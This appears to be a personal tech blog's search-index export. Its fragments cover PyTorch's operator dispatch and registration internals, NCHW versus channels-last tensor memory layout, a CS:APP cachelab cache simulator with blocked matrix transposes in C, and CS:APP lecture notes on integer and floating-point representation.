at::Tensor contiguous::call(const at::Tensor \u0026 self, at::MemoryFormat memory_format) { static auto op = create_contiguous_typed_handle(); return op.call(self, memory_format); } static C10_NOINLINE c10::TypedOperatorHandle\u003ccontiguous::schema\u003e create_contiguous_typed_handle() { return c10::Dispatcher::singleton() .findSchemaOrThrow(contiguous::name, contiguous::overload_name) .typed\u003ccontiguous::schema\u003e(); } 这里的contiguous::name/overload_name来自continuous_ops.h（生成代码） // build/aten/src/ATen/ops/contiguous_ops.h struct TORCH_API contiguous { using schema = at::Tensor (const at::Tensor \u0026, at::MemoryFormat); using ptr_schema = schema*; STATIC_CONSTEXPR_STR_INL_EXCEPT_WIN_CUDA(name, \"aten::contiguous\") STATIC_CONSTEXPR_STR_INL_EXCEPT_WIN_CUDA(overload_name, \"\") STATIC_CONSTEXPR_STR_INL_EXCEPT_WIN_CUDA(schema_str, \"contiguous(Tensor(a) self, *, MemoryFormat memory_format=contiguous_format) -\u003e Tensor(a)\") static at::Tensor call(const at::Tensor \u0026 self, at::MemoryFormat memory_format); static at::Tensor redispatch(c10::DispatchKeySet dispatchKeySet, const at::Tensor \u0026 self, at::MemoryFormat memory_format); }; 我们展开说明op的获取流程，首先拿到一个Dispatcher的singleton（单例） // aten/src/ATen/core/dispatch/Dispatcher.h class TORCH_API Dispatcher final { C10_ALWAYS_INLINE static Dispatcher\u0026 singleton() { static Dispatcher\u0026 s = realSingleton(); return s; } } // aten/src/ATen/core/dispatch/Dispatcher.cpp C10_EXPORT Dispatcher\u0026 Dispatcher::realSingleton() { static Dispatcher _singleton; return _singleton; } 随后拿着dispatcher的单例去findSchemaOrThrow() // aten/src/ATen/core/dispatch/Dispatcher.cpp OperatorHandle Dispatcher::findSchemaOrThrow(const char* name, const char* overload_name) { // 这里name = \"aten::contiguous\", overload_name = \"\" auto it = findSchema({name, overload_name}); if (!it.has_value()) { auto it2 = findOp({name, overload_name}); // ... } return it.value(); } c10::optional\u003cOperatorHandle\u003e Dispatcher::findSchema(const OperatorName\u0026 overload_name) { // (const c10::OperatorName) (name = \"aten::contiguous\", overload_name = \"\") auto it = findOp(overload_name); if (it.has_value()) { if (it-\u003ehasSchema()) { return it; } else { return c10::nullopt; } } else { return it; } } c10::optional\u003cOperatorHandle\u003e Dispatcher::findOp(const OperatorName\u0026 overload_name) { return operatorLookupTable_.read( [\u0026] (const ska::flat_hash_map\u003cOperatorName, OperatorHandle\u003e\u0026 operatorLookupTable) -\u003e c10::optional\u003cOperatorHandle\u003e { auto found = operatorLookupTable.find(overload_name); if (found == operatorLookupTable.end()) { return c10::nullopt; } return found-\u003esecond; } ); } 这里的operatorLookupTable_是Dispatcher.h中声明的一个私有变量LeftRight\u003cska::flat_hash_map\u003cOperatorName, OperatorHandle\u003e\u003e operatorLookupTable_;，简单来说是一个哈希表，这里传了一个匿名函数进去，在哈希表中查找name，如果有则返回找到的OperatorHandle，如果没有则返回nullopt template \u003cclass T\u003e class LeftRight final { template \u003ctypename F\u003e auto read(F\u0026\u0026 readFunc) const -\u003e typename c10::invoke_result_t\u003cF, const T\u0026\u003e { // ... // _data[_foregroundDataIndex.load()]拿到了所需的 operatorLookupTable return readFunc(_data[_foregroundDataIndex.load()]); } } 这里我们找到了对应的c10::OptionalBase\u003cc10::OperatorHandle\u003eop并返回，随后经过typed()最终生成了c10::TypedOperatorHandle\u003cat::Tensor (const at::Tensor \u0026, c10::MemoryFormat)\u003e给到外层static变量op。 到这里第一步查找schema步骤完成，我们接着开始查找并调用kernel。 // build/aten/src/ATen/Operators_4.cpp at::Tensor contiguous::call(const at::Tensor \u0026 self, at::MemoryFormat memory_format) { static auto op = create_contiguous_typed_handle(); return op.call(self, memory_format); } 随后就调用call方法 // aten/src/ATen/core/dispatch/Dispatcher.h template\u003cclass Return, class... Args\u003e class TypedOperatorHandle\u003cReturn (Args...)\u003e final : public OperatorHandle { // ... C10_ALWAYS_INLINE Return call(Args... args) const { return c10::Dispatcher::singleton().call\u003cRet","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:7:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"5. 为什么能在表里找到contiguous算子：算子register 上文中我们梳理了contiguous的dispatch流程，但有分发就一定有注册，contiguous算子的schema是如何注册到OperatorHandle中的，其kernel又是如何注册到dispatchTable_中的呢？ 在开始说明contiguous算子注册流程前，我们先简单了解一下通用的pytorch算子注册流程，即通过TORCH_LIBRARY(ns, m)和TORCH_LIBRARY_IMPL(ns, k, m)两个宏进行两步注册。 // torch/library.h #define TORCH_LIBRARY(ns, m) \\ static void TORCH_LIBRARY_init_##ns(torch::Library\u0026); \\ static const torch::detail::TorchLibraryInit TORCH_LIBRARY_static_init_##ns( \\ torch::Library::DEF, \u0026TORCH_LIBRARY_init_##ns, \\ #ns, \\ c10::nullopt, \\ __FILE__, \\ __LINE__); \\ void TORCH_LIBRARY_init_##ns(torch::Library\u0026 m) #define TORCH_LIBRARY_IMPL(ns, k, m) _TORCH_LIBRARY_IMPL(ns, k, m, C10_UID) 首先，会调用TORCH_LIBRARY(ns, m)宏在nsnamespace下注册schema（本质是通过Dispatcher写入OperatorEntry.schema_字段），此时只有一个空dispatch table，具体kernel还没有注册。 // build/aten/src/ATen/RegisterSchema.cpp TORCH_LIBRARY(aten, m) { m.def(\"batch_norm(Tensor input, Tensor? weight, Tensor? bias, Tensor? running_mean, Tensor? running_var, bool training, float momentum, float eps, bool cudnn_enabled) -\u003e Tensor\", {}); m.def(\"contiguous(Tensor(a) self, *, MemoryFormat memory_format=contiguous_format) -\u003e Tensor(a)\", {}); } 随后，会调用TORCH_LIBRARY_IMPL(ns, k, m)注册算子具体实现（本质是通过Dispatcher写入OperatorEntry.dispatchTable_字段），绑定具体dispatch key，如CompositeImplicitAutograd、CPU、CUDA等。有一些特殊的设计如catchall等会扩散写入所有disptachkey，基于BackendSelect实现fallback会redispatch到下一个优先级的dispatch key等。 例如： // build/aten/src/ATen/RegisterCompositeImplicitAutograd.cpp TORCH_LIBRARY_IMPL(aten, CompositeImplicitAutograd, m) { // lots of ops m.impl(\"batch_norm\", TORCH_FN(wrapper_CompositeImplicitAutograd__batch_norm)); m.impl(\"contiguous\", TORCH_FN(wrapper_CompositeImplicitAutograd__contiguous)); } 了解了基本算子注册方式后，我们详细展开算子注册流程： 首先对TORCH_LIBRARY_IMPL我们进行宏展开 // torch/library.h // C10_UID是一个unique identifier，自增 counter #define _TORCH_LIBRARY_IMPL(ns, k, m, uid) \\ static void C10_CONCATENATE( \\ TORCH_LIBRARY_IMPL_init_##ns##_##k##_, uid)(torch::Library\u0026); \\ static const torch::detail::TorchLibraryInit C10_CONCATENATE( \\ TORCH_LIBRARY_IMPL_static_init_##ns##_##k##_, uid)( \\ torch::Library::IMPL, \\ c10::guts::if_constexpr\u003cc10::impl::dispatch_key_allowlist_check( \\ c10::DispatchKey::k)\u003e(\\ []() { return \u0026C10_CONCATENATE( \\ TORCH_LIBRARY_IMPL_init_##ns##_##k##_, uid); \\ }, \\ []() { return [](torch::Library\u0026) -\u003e void {}; }), \\ #ns, \\ c10::make_optional(c10::DispatchKey::k), \\ __FILE__, \\ __LINE__); \\ void C10_CONCATENATE( \\ TORCH_LIBRARY_IMPL_init_##ns##_##k##_, uid)(torch::Library \u0026 m) static void TORCH_LIBRARY_IMPL_init_aten_CompositeImplicitAutograd_12(torch::Library\u0026); static const torch::detail::TorchLibraryInit TORCH_LIBRARY_IMPL_static_init_aten_CompositeImplicitAutograd_12( torch::Library::IMPL, c10::guts::if_constexpr\u003cc10::impl::dispatch_key_allowlist_check( c10::DispatchKey::CompositeImplicitAutograd)\u003e([]() { return \u0026TORCH_LIBRARY_IMPL_init_aten_CompositeImplicitAutograd_12; }, []() { return [](torch::Library\u0026) -\u003e void {}; }), \"aten\", c10::make_optional(c10::DispatchKey::CompositeImplicitAutograd), \"pytorch/build/aten/src/ATen/RegisterCompositeImplicitAutograd.cpp\", 7156); void TORCH_LIBRARY_IMPL_init_aten_CompositeImplicitAutograd_12( torch::Library\u0026 m) { m.impl(\"batch_norm\", TORCH_FN(wrapper_CompositeImplicitAutograd__batch_norm)); m.impl(\"contiguous\", ::c10::CompileTimeFunctionPointer\u003c std::remove_pointer_t\u003cstd::remove_reference_t\u003cdecltype(wrapper_CompositeImplicitAutograd__contiguous)\u003e\u003e, wrapper_CompositeImplicitAutograd__contiguous\u003e()); } TORCH_LIBRARY_IMPL_init_aten_CompositeImplicitAutograd_12会在我们import torch的时候被TorchLibraryInit调用，此处不详细展开，我们重点看m.impl发生了什么 // torch/library.h class TORCH_API Library final { template \u003ctypename Name, typename Func\u003e Library\u0026 impl(Name name, Func\u0026\u0026 raw_f, _RegisterOrVerify rv = _RegisterOrVerify::REGISTER) \u0026 { #if defined C10_MOBILE CppFunction f(std::forward\u003cFunc\u003e(raw_f), NoInferSchemaTag()); #else CppFunction f(std::forward\u003cFunc\u003e(raw_f)); #endif return _impl(name, std::move(f), rv); } } class TORCH_API CppFunction final { templ","date":"2023-03-11","objectID":"/posts/pytorch/how_pytorch_call_op_1/:8:0","tags":null,"title":"How Pytorch 2.0 Call Ops(1)","uri":"/posts/pytorch/how_pytorch_call_op_1/"},{"categories":["pytorch"],"content":"Summary This article will introduce the two commonly used forms of memory storage in pytorch: NCHW and NHWC (channel-last) ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:1:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"To be translated Oh Sorry! This blog has’t been translated to English, please wait for a little while… ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:2:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"实例引入 假设有一个NCHW的Tensor X， X.shape = [1, 64, 5, 4]，行优先排序（row-major），如下图所示 其内存排序如图所示（优先访问W、H，然后通道C +=1） 如果它是以NHWC的形式排布，那么将变为（优先访问不同通道的数据，然后再W、H+=1） ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:3:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"Stride, Contiguous介绍 import torch N, C, H, W = 1, 64, 5, 4 x = torch.rand(N, C, H, W) print(x.shape) # torch.Size([1, 64, 5, 4]) print(x.stride()) # (1280, 20, 4, 1) print(x.contiguous()) # True Stride即在内存中需要迈出去的步长，其计算方式如下 size_t stride = 1; for (int i = ndim_ - 1; i \u003e= 0; i--) { stride_[i] = stride; stride *= shape_[i]; } 例如，每要取下一个H的值，我们知道要遍历4个行元素（W=4），那么我们就可以根据stride[2]=4直接拿到这个值，并让内存指针加4，获取到我们需要的元素。再比如要取下一个C，内存指针直接+20，就可以取到对应值。 Contiguous即内存空间排布是否连续，因为我们是行优先，所以能按照行的顺序访问即符合连续定义，是否连续判定代码如下： bool is_contiguous() const { size_t stride = 1; for (int i = ndim_ - 1; i \u003e= 0; i--) { if (stride_[i] != stride) { return false; } stride *= shape_[i]; } return true; } 一般地，对tensor的操作（如transpose、permute等）只改变tensor的描述（shape、stride），不会改变tensor实际内存结构。例如： import torch N, C, H, W = 1, 3, 2, 2 x = torch.randint(1,30,(N, C, H, W)) print(x.is_contiguous()) # True print(x.storage()) # [25, 29, 28, 6, 12, 25, 4, 20, 17, 21, 19, 5] print(x.shape) # torch.Size([1, 3, 2, 2]) print(x.stride()) # (12, 4, 2, 1) x = torch.transpose(x, 0, 2) print(x.is_contiguous()) # False print(x.storage()) # [25, 29, 28, 6, 12, 25, 4, 20, 17, 21, 19, 5] print(x.shape) # torch.Size([2, 3, 1, 2]) print(x.stride()) # (2, 4, 12, 1) 然而memory format的变更不仅改变tensor的描述，还需要直接改变tensor的storage，如下文中NCHW和NHWC之间的转换就改变了内存结构。 ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:4:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"NCHW 和 NHWC 之间的转换 import torch N, C, H, W = 1, 64, 5, 4 x = torch.rand(N, C, H, W) x = x.contiguous(memory_format=torch.channels_last) print(x.shape) # torch.Size([1, 64, 5, 4]) print(x.stride()) # (1280, 1, 256, 64) print(x.is_contiguous()) # False 可以看到，shape没有发生改变，而stride从(1280, 20, 4, 1)变为了(1280, 1, 256, 64) 该stride变化是如何产生的呢？请看下面的代码 int64_t stride = 1; for (auto k : {1, 3, 2, 0}) { strides[k] = stride; stride *= shapes[k]; } 即优先访问C上元素，再访问W、H最后访问N。是怎么通过stride实现这样优先访问的呢？我们首先要了解它是如何取值的 // 通过索引取值 data_t operator[](std::vector\u003csize_t\u003e idxs) const { size_t offset = 0; for (size_t i = 0; i \u003c ndim_; i++) { offset += idxs[i] * stride_[i]; } return data_[offset]; } 例如，用户访问tensor_channel_last[0,1,0,0]的数据，想获取下一个c的值，那么offset = 1280 * 0 + 1 * 1 + 256 * 0 + 64 * 0 = 1，正好取到了offset=1的数据 这里就引出了一个疑问，数据指针offset=1不是指向w=1的值吗？所以当变更为channel-last之后，数据在内存一维数组上的排布也发生了改变，以符合适配的offset。 我们取一个小一点的tensor来分析内存排布 import torch N, C, H, W = 1, 3, 2, 2 x = torch.randint(1,30,(N, C, H, W)) print(x.storage()) # [ 14 16 20 11 8 26 15 18 29 21 10 3] x = x.contiguous(memory_format=torch.channels_last) print(x.storage()) # [ 14 8 29 16 26 21 20 15 10 11 18 3] 可以看到，原本索引为4的8（对应c1h0w0）现在索引变为了1，正好与新的stride适配。 ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:5:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"为什么要做NCHW和NHWC的区分和转换——性能上的提升 在部分算子运算时，其实更需要获取下一维度的C，如果按照continuous取法，那么偏移量为H*W，虽然取值仍然是O（1），但却无法命中缓存导致性能下降。转换为NHWC后，每一次取C的值都会变得很便利。 根据pytorch文档显示，和AMP（Automated Mixed Precision，自动混合精度）一起使用的时候，在NVIDIA GPU上可以取得22%的性能提升。即使只在CPU上，也能因为更好命中缓存而取得性能提升。 ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:6:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["pytorch"],"content":"Reference NVIDIA Deep Learning cuDNN Documentation Pytorch NCHW/NHWC (BETA) CHANNELS LAST MEMORY FORMAT IN PYTORCH Confused about some of the content? Feel free to report an issue here. ","date":"2023-03-04","objectID":"/posts/pytorch/memory_format/:7:0","tags":null,"title":"Tensor Memory Format","uri":"/posts/pytorch/memory_format/"},{"categories":["csapp"],"content":"Summary In this lab, we will write a small C program that simulates the behavior of a cache memory and optimize a small matrix transpose function. Source: [https://github.com/yewentao256/CSAPP_15213/tree/main/cachelab] ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:1:0","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Introduction In this lab, there are two parts: Write a small C program (about 200-300 lines) that simulates the behavior of a cache memory. Optimize a small matrix transpose function, with the goal of minimizing the number of cache misses. ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:2:0","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to launch(Using docker) Source from Yansongsongsong Firstly using a docker: docker run -d -p 9912:22 --name datalab yansongsongsong/csapp:cachelab Then using vscode plugin remote ssh ssh root@127.0.0.1 -p 9912 password: THEPASSWORDYOUCREATED ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:3:0","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Part A: Writing a Cache Simulator In Part A we will write a cache simulator in csim.c that takes a valgrind memory trace as input, simulates the hit/miss behavior of a cache memory on this trace, and outputs the total number of hits, misses, and evictions. ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:4:0","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to get command line options? int main(int argc, char **argv) { int opt, aflag = 0, nflag = 0; float xflag = 0.0; /* loop over arguments */ while (-1 != (opt = getopt(argc, argv, \"an:y:\"))) { /* determine which argument was found */ switch (opt) { case 'a': aflag = 1; break; case 'n': nflag = atoi(opt); break; case 'x': xflag = atof(opt); break; default: printf(\"unknown argument\"); break; } } return 0; } ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:4:1","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to get content from files? FILE * fp; fp = fopen (\"traces/yi.trace\", \"r\"); if ( fp == NULL ) { // check here } char access_type; unsigned long address; int size; while(fscanf(fp, \" %c %lx,%d\", \u0026access_type, \u0026address, \u0026size) \u003e 0){ printf(\" %c %lx,%d\\n\", access_type, address, size); } fclose(fp); // always remember to free the memory you'v used ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:4:2","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"How to realize LRU? The basic idea is to realize by queue, but there is no std library for C. So we use a lru_counter, when recently used, set counter to 0, add one for other block. When eviction, remove the block that has the biggest counter. // add 1 to lru_counter and find the biggest one // may do eviction(only happens when all of the lines are valid) for (int i = 0; i \u003c E; i++) { if (max_counter \u003c sets[s_index].lines[i].lru_counter) { eviction_index = i; max_counter = sets[s_index].lines[i].lru_counter; } sets[s_index].lines[i].lru_counter += 1; } if (need_evict) { // do your logic } ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:4:3","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"The answer Carefully read all the instructions above, we now know how to realize the simulator. Here are my codes which can get all of the scores in test. #include \u003cgetopt.h\u003e #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003cstring.h\u003e #include \"cachelab.h\" typedef struct Line { int valid; int tag; // for lru eviction, remove the biggest counter, set 0 when used int lru_counter; } Line; typedef struct Set { Line *lines; } Set; /* global variables */ unsigned int s = 0, E = 0, b = 0; char access_log[20] = \"\"; Set *sets; int hit_count = 0, miss_count = 0, eviction_count = 0; void access_cache(unsigned long address) { unsigned int tag = address \u003e\u003e (s + b); int s_index = address \u003e\u003e b \u0026 ((1 \u003c\u003c s) - 1); // (1 \u003c\u003c s)-1 for % int eviction_index = -1, max_counter = -1; int need_evict = 1; // first loop to see whether there is a match, or cold start for (size_t i = 0; i \u003c E; i++) { if (sets[s_index].lines[i].valid) { // valid, compare tag if (sets[s_index].lines[i].tag == tag) { // hit hit_count += 1; sets[s_index].lines[i].lru_counter = 0; need_evict = 0; strcat(access_log, \"hit \"); break; } else { // tag mismatch, continue to next one continue; } } else { // cold start sets[s_index].lines[i].valid = 1; sets[s_index].lines[i].tag = tag; sets[s_index].lines[i].lru_counter = 0; strcat(access_log, \"miss \"); miss_count += 1; need_evict = 0; break; } } // second loop: add 1 to lru_counter and find the biggest one // may do eviction(only happens when all of the lines are valid) for (int i = 0; i \u003c E; i++) { if (max_counter \u003c sets[s_index].lines[i].lru_counter) { eviction_index = i; max_counter = sets[s_index].lines[i].lru_counter; } sets[s_index].lines[i].lru_counter += 1; } if (need_evict) { sets[s_index].lines[eviction_index].valid = 1; sets[s_index].lines[eviction_index].tag = tag; sets[s_index].lines[eviction_index].lru_counter = 0; strcat(access_log, \"miss eviction \"); miss_count += 1; eviction_count += 1; } } int main(int argc, char **argv) { /* P1: get user input*/ int opt, hflag = 0, vflag = 0; char *tflag; // no \":\" means an option, one \":\" means there must have one param // two \":\" means the option can have param const char *opt_string = \"hvs:E:b:t:\"; /* loop over arguments */ while ((opt = getopt(argc, argv, opt_string)) != -1) { /* determine which argument was found */ switch (opt) { case 'h': hflag = 1; break; case 'v': vflag = 1; break; case 's': s = atoi(optarg); break; case 'E': E = atoi(optarg); break; case 'b': b = atoi(optarg); break; case 't': tflag = optarg; break; default: printf(\"unknown argument\"); break; } } /*P2: dealing with user input, initialize the Set*/ if (hflag) { printf( \"Welcome using my cache lab simulatorm, friend! I am yewentao or Peter \" \"Ye in English, here are some command options which may help you.\\n \" \"-h: Optional help flag that prints usage info\\n \" \"-v: Optional verbose flag that displays trace info\\n \" \"-s \u003cs\u003e: Number of set index bits (S = 2^s is the number of sets)\\n \" \"-E \u003cE\u003e: Associativity (number of lines per set)\\n \" \"-b \u003cb\u003e: Number of block bits (B = 2^b is the block size)\\n \" \"-t \u003ctracefile\u003e: Name of the valgrind trace to replay\\n \"); return 0; } unsigned int S = 1 \u003c\u003c s; sets = (Set *)malloc(sizeof(Set) * S); for (int i = 0; i \u003c S; i++) { Line *lines = (Line *)malloc(sizeof(Line) * E); sets[i].lines = lines; } /*P3: scan the file and process each line*/ char access_type; unsigned long address; int size; FILE *fp; fp = fopen(tflag, \"r\"); if (fp == NULL) { printf(\"Fail to open file %s! Please check the path you input\", tflag); exit(0); } while (fscanf(fp, \" %c %lx,%d\", \u0026access_type, \u0026address, \u0026size) \u003e 0) { strcpy(access_log, \"\"); // clear the log string switch (access_type) { case 'L': access_cache(address); break; case 'M': access_cache(address); access_cache(address); break; case 'S': access_cache(address); break; default: break; } if (vflag \u0026\u0026 (access_type != 'I')) { printf(\"%c %lx,%d %s\\n\", access_type, address, size, access_log); } } /* P4: print the result*/ printSummary(hit_count, mis","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:4:4","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Part B：Optimizing Matrix Transpose In Part B we will write a transpose function in trans.c that causes as few cache misses as possible. Note: We don’t recommend to spend too much time here, since it’s non-readable for your teammates in real project, and it is only useful for specific CPU and Cache. The param of cache is: s=5, b=5, E=1, so there are 32 sets, one line for each set and 32 bytes data in each line. ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:5:0","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"32 * 32 Our cache can save 8 int(32 bytes) per line, so the common idea is to use 8 * 8 block to speed up. Note: we can do this because there are enough(32) sets in cache, which satisfies our needs, if there are only 16 sets(eg: s = 4), we can’t use this strategy. This is because if s=4, the first line in block A uses set0, the second line uses sets4… and the fourth line uses set0 again, which will cause conflicts. int i, j, m, n; for (i = 0; i \u003c N; i += 8) for (j = 0; j \u003c M; j += 8) for (m = i; m \u003c i + 8; ++m) for (n = j; n \u003c j + 8; ++n) { B[n][m] = A[m][n]; } ref code: 1183 misses, our code: 343 misses Is there any ways to make more use of cache? Yes! We can use local variable to directly save all of the elements in one line of A, to reduce conflict with B. (A and B share the cache, furthermore, if you calculate the cahce set index, the same array index in A and B share the same cache set line) int i, j, k, v1, v2, v3, v4, v5, v6, v7, v8; for (i = 0; i \u003c 32; i += 8) for (j = 0; j \u003c 32; j += 8) for (k = i; k \u003c (i + 8); ++k) { v1 = A[k][j]; v2 = A[k][j + 1]; v3 = A[k][j + 2]; v4 = A[k][j + 3]; v5 = A[k][j + 4]; v6 = A[k][j + 5]; v7 = A[k][j + 6]; v8 = A[k][j + 7]; B[j][k] = v1; B[j + 1][k] = v2; B[j + 2][k] = v3; B[j + 3][k] = v4; B[j + 4][k] = v5; B[j + 5][k] = v6; B[j + 6][k] = v7; B[j + 7][k] = v8; } ref code: 1183 misses, our code: 287 misses ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:5:1","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"64 * 64 Since there are more data, the cache can’t hold block in 8*8. Why? the first line in block uses set0 for example, the second line uses set8… and the fourth line uses set0 again which will cause conflicts. So we make the block size smaller – 4*4. int i, j, k, v1, v2, v3, v4; for (i = 0; i \u003c M; i += 4) for(j = 0; j \u003c M; j += 4) for(k = i; k \u003c (i + 4); ++k) { v1 = A[k][j]; v2 = A[k][j+1]; v3 = A[k][j+2]; v4 = A[k][j+3]; B[j][k] = v1; B[j+1][k] = v2; B[j+2][k] = v3; B[j+3][k] = v4; } ref code: 4723 misses, our code: 1699 misses ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:5:2","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"61 * 67 There are no specific rules for irregular matrix, simply test different block size and get the best result ref code: 4723 misses block_size = 4: 2425 misses block_size = 8: 2118 misses block_size = 16: 1992 misses block_size = 17: 1950 misses, block_size = 18: 1961 misses we choose the best one: int i, j, k, l; for (i = 0; i \u003c N; i += 17) { for (j = 0; j \u003c M; j += 17) { for (k = i; k \u003c i + 17 \u0026\u0026 k \u003c N; k++) { for (l = j; l \u003c j + 17 \u0026\u0026 l \u003c M; l++) { B[l][k] = A[k][l]; } } } } Confused about some of the content? Feel free to report an issue here. ","date":"2023-02-19","objectID":"/posts/csapp/cachelab/:5:3","tags":null,"title":"Cachelab","uri":"/posts/csapp/cachelab/"},{"categories":["csapp"],"content":"Summary My note while learning through CSAPP-15213 videos. Including Overview, Bits,Bytes, and Integers, Floating Point, Machine Level Programing, Program Optimization and Memory. Source: [https://github.com/yewentao256/CSAPP_15213] ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:1:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"1. Overview ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:2:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Course theme theme：Abstraction is good but don’t forget reality ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:2:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Five realities ints are not integers；floats are not real To understand numbers in computer eg：x^2 \u003e= 0? for float：yes！ for int： 40000*40000=1600000000 yes! 50000*50000=?? not! eg：(x+y) + z = x+(y+z)? for int: yes! for于 float: (1e20+-1e20)+3.14 = 3.14； (1e20+(-1e20+3.14) = ?? you’ve got to know assembly learning about assembly memory matters memory management eg： there’s more to performance than asymptotic complexity eg： computers do more than execute programs IO/network ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:2:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"How the course fits into the CS/ECE curriculum build up the base for another courses. ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:2:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Course architecture programs and data L1(datalab): manipulating bits L2(bomblab): defuse a binary bomb L3(attacklab): injection attacks memory hierarchy L4(cachlab): build a cache simulator Exceptional control flow L5(tshlab): write a shell Virtual memory L6(malloclab): write a malloc package networking and concurrency L7(proxylab): write a web proxy ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:2:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"2. Bits,Bytes, and Integers ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:3:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Representing information as bits Everything is bits. Encoding Byte values. ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:3:1","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Bit-level manipulations Boolean Algebra Bit-level options in C: \u0026 | ~ ^ Logic Operations in C: \u0026\u0026 || ! Shift operations eg: ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:3:2","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Integers Unsigned and signed Numeric ranges signed: Tmax, Tmin unsigned: Umax, Umin Conversion, casting B2T, T2B B2U, U2B U2T, T2U Note: if both signed and unsigned in one expression, signed value implicitly cast to unsigned. eg: for(int i = n; i-sizeof(char); i--) {} // run forever! Corner case: normally -(-x) = x, but -Tmin(-32) != Tmax(31) (number is in 5 bits) Expanding, truncating expanding eg: 1010(-6) -\u003e 111010(-6) truncating eg: unsigned: 11011(27) -\u003e 1011(9) // mod 16 just remember: directly get the bytes then calculate it. Addition, negation, multiplication, shifting addition(negation) unsigned addition complement addition overflow multiplication unsigned multiplication signed multiplication eg: 5 * 5 = 25:0001-1001(-7). the result is -7 shift power-of-2 multiply with shift unsigned power-of-2 division with shift eg: 0011(3) /2 (»1) = 0001(1)–logical shift signed power-of-2 division: eg: 1101(-3) /2 (»1) = 1110(-2)–arithmetic shift extra: x -\u003e -x, just do !x+1 eg: -(1010) (-6) = 0101+0001 = 0110(6) ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:3:3","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Representations in memory, pointers and strings Byte-Oriented Memory Organization Machine words: 32bits, 64bits Word-Oriented Memory Organization Byte Ordering ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:3:4","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"3. Floating Point ","date":"2023-02-03","objectID":"/posts/csapp/csapp_class_notes/:4:0","tags":null,"title":"CSAPP Class Notes","uri":"/posts/csapp/csapp_class_notes/"},{"categories":["csapp"],"content":"Fractional binary number eg: 5 + 3/4 = 